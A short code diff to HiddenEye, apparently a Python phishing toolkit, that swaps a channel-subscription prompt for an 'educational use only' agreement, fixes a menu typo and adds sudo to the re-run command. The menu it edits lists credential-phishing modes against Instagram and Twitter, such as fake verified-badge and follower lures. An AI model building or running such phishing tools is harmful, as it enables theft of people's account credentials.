@@ -1,4 +1,4 @@
-# Any actions must be here
+# build by Mr.Fuck
 
 import getpass
 import base64
@@ -568,16 +568,14 @@ def runMainMenu():  # menu where user select what they wanna use
     red  = '\033[31m'
     print("\n\n\n              {2}WITH GREAT {1}POWER {3}- {2}COMES GREAT {1}RESPONSIBILITY      ".format(orange, red, purple, blue))
     
-    if input("\n\n\n\n{2}[{1}!{2}]{3} Have you subscribed to the Andro coding channel? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
+    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
         system('clear')
-        print("\n\n[ {0}You haven't subscribed to the Andro Coding channel. please subscribe first!{1} ]\n\n".format(MAIN0, MAIN4))
-        system('xdg-open https://www.youtube.com/channel/UCxJwssohxaU0BSWdY4ayneQ')
+        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
         exit()
 
 
 def mainMenu():
     system('clear')
-    system('xdg-open https://www.youtube.com/channel/UCy3yZre3lXn04kLajnTzM2Q')
     with open('version.txt') as f:
         ver_current = f.read()
         version = ver_current.strip()
@@ -652,7 +650,7 @@ ________________________________________________________________________________
         runPhishing('Twitter', customOption)
     elif option == '8' or option == '08':
         loadModule('Instagram')
-        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phishing (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Instagram', customOption)
     elif option == '9' or option == '09':
         loadModule('Snapchat')
@@ -1046,7 +1044,7 @@ def endMessage(port):  # Message when HiddenEye exit
     choice = input(
         "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
     if choice == 'R' or choice == 'r':
-        system('python3 HiddenEye.py')
+        system('sudo python3 HiddenEye.py')
     elif choice == 'M' or choice == 'm':
         emailPrompt3(port)
     elif choice == 'S' or choice == 's':
